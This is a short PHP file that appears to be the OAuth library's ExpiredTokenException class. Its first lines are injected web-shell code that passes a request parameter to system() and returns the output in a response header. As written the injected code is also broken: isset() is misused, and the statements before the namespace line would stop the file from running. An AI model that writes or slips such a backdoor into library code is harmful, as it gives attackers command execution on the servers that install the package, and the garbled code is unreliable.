<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\Common\Token\Exception;

use OAuth\Common\Exception\Exception;

/**
 * Exception thrown when an expired token is attempted to be used.
 */
class ExpiredTokenException extends Exception
{
}
